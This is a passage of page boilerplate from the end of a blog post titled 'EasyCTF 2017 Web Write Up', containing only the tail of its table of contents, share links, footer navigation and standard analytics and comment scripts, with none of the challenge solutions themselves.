href="#problem-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-tunnel"><span class="toc-number">1.8.</span> <span class="toc-text">Web tunnel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">solution</span></a></li></ol></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" href="https://www.facebook.com/sharer.php?u=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;text=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;is_video=false&amp;description=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="../../../../cdn-cgi/l/email-protection.html#9fa0eceafdf5fafceba2dafeece6dccbd9bfadafaea8bfc8fafdbfc8edf6ebfabfcaefb9fdf0fbe6a2dcf7fafcf4bff0eaebbfebf7f6ecbffeedebf6fcf3faa5bff7ebebefeca5b0b0f7fefcf4f9eaf1b1f0edf8b0adafaea8b0afabb0afa6b0dafeece6dccbd9b2adafaea8b2c8fafdb2c8edf6ebfab2caefb0"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;title=EasyCTF%202017%20Web%20Write%20Up"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://www.tumblr.com/share/link?url=https://hackfun.org/2017/04/09/EasyCTF-2017-Web-Write-Up/&amp;name=EasyCTF%202017%20Web%20Write%20Up&amp;description=%3Cp%3E%E4%BD%9C%E8%80%85:%3Ca%20href=%22https://www.zhihu.com/people/sunnyelf/%22%20target=%22_blank%22%20rel=%22external%22%3EJing%20Ling%3C/a%3E%3Cbr%3E%E5%8D%9A%E5%AE%A2:%3Ca%20href=%22https://www.hackfun.org%22%20target=%22_blank%22%20rel=%22external%22%3EHackFun%3C/a%3E%3C/p%3E%3Ch1%20id=%220x05-Web%22%3E%3Ca%20href=%22#0x05-Web%22%20class=%22headerlink%22%20title=%220x05%20Web%22%3E%3C/a%3E0x05%20Web%3C/h1%3E%3Ch2%20id=%22Cookie-Blog%22%3E%3Ca%20href=%22%23Cookie-Blog%22%20class=%22headerlink%22%20title=%22Cookie%20Blog%22%3E%3C/a%3ECookie%20Blog%3C/h2%3E%3Ch3%20id=%22problem%22%3E%3Ca%20href=%22%23problem%22%20class=%22headerlink%22%20title=%22problem%22%3E%3C/a%3Eproblem%3C/h3%3E%3Cp%3EI%20found%20the%20cookie%20monster%E2%80%99s%20%3Ca%20href=%22http://cookieblog.web.easyctf.com/%22%20target=%22_blank%22%20rel=%22external%22%3Eblog%3C/a%3E!%3C/p%3E"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><ul><li id="toc"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#toc-footer&quot;).toggle(),!1" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li><li id="share"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#share-footer&quot;).toggle(),!1" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li><li id="top" style="display:none"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; $(&quot;html, body&quot;).animate({scrollTop:0},&quot;fast&quot;)" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li><li id="menu"><a class="icon" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; return $(&quot;#nav-footer&quot;).toggle(),!1" data-cf-modified-914bcd6c39cc5d7fc9e6fdaf-><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li></ul></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2018 Jing Ling</div><div class="footer-right"><nav><ul><li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about/index.html">About</a></li><li><a href="../../../../link/index.html">Link</a></li><li><a href="../../../../tags/kali-linux/index.html">Kali</a></li><li><a href="../../../../archives/index.html">Archives</a></li><li><a href="https://github.com/sunnyelf">Projects</a></li><li><a href="../../../../search/index.html">Search</a></li></ul></nav></div></footer><script data-cfasync="false" src="../../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="../../../../cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="914bcd6c39cc5d7fc9e6fdaf-|49" defer></script></body></html><link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://cdn.bootcss.com/justifiedGallery/3.6.1/css/justifiedGallery.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/2.1.3/jquery.min.js" type="914bcd6c39cc5d7fc9e6fdaf-text/javascript"></script><script src="https://cdn.bootcss.com/justifiedGallery/3.6.1/js/jquery.justifiedGallery.min.js" type="914bcd6c39cc5d7fc9e6fdaf-text/javascript"></script><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" type="914bcd6c39cc5d7fc9e6fdaf-text/javascript"></script><script src="../../../../js/main.min.js" type="914bcd6c39cc5d7fc9e6fdaf-text/javascript"></script><script type="914bcd6c39cc5d7fc9e6fdaf-text/javascript">!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src="//www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-97495608-1","auto"),ga("send","pageview")</script><script type="914bcd6c39cc5d7fc9e6fdaf-text/javascript">var disqus_shortname="sunnyelf";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script>